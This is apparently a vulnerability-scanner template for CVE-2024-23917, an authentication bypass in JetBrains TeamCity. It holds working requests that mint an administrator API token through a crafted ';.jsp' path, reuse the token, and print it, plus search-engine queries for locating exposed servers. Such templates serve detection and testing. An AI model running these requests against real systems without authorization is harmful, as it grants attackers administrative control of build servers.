flow: http(1) && http(2)
http:
- extractors:
  - group: 1
    internal: true
    name: authtoken
    part: body
    regex:
    - value="(.+)"
    type: regex
  headers:
    Content-Type: application/x-www-form-urlencoded
  matchers:
  - condition: and
    dsl:
    - status_code==200
    - contains(content_type,'application/xml')
    - contains(body,"<token name=\"{{randstr}}\"")
    internal: true
    type: dsl
  method: POST
  path:
  - '{{BaseURL}}/app/rest/users/id:1/tokens/{{randstr}};.jsp?jsp_precompile=true'
- extractors:
  - dsl:
    - '"Token:" + authtoken'
    type: dsl
  headers:
    Authorization: Bearer {{authtoken}}
  matchers:
  - condition: and
    dsl:
    - status_code==200
    - contains(content_type,'application/xml')
    - contains(body,'<projects href=')
    type: dsl
  method: GET
  path:
  - '{{BaseURL}}/app/rest/server'
id: CVE-2024-23917
info:
  author: iamnoooob,rootxharsh,pdresearch
  classification:
    cpe: cpe:2.3:a:jetbrains:teamcity:*:*:*:*:*:*:*:*
    cve-id: CVE-2024-23917
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-306,CWE-288
    epss-percentile: 0.99963
    epss-score: 0.94377
  description: 'In JetBrains TeamCity before 2023.11.3 authentication bypass leading
    to RCE was possible

    '
  impact: 'Unauthenticated attackers can bypass authentication to gain administrative
    access and potentially execute code on the TeamCity server.

    '
  metadata:
    fofa-query: title=teamcity
    google-query: intitle:teamcity
    max-request: 2
    product: teamcity
    shodan-query:
    - http.title:teamcity
    - http.component:"teamcity"
    vendor: jetbrains
    verified: true
  name: JetBrains TeamCity > 2023.11.3 - Authentication Bypass
  reference:
  - https://github.com/fkie-cad/nvd-json-data-feeds
  - https://www.rapid7.com/db/vulnerabilities/jetbrains-teamcity-cve-2024-23917/
  remediation: 'Update JetBrains TeamCity to version 2023.11.3 or later.

    '
  severity: critical
  tags: cve,cve2024,auth-bypass,teamcity,jetbrains,vkev,vuln
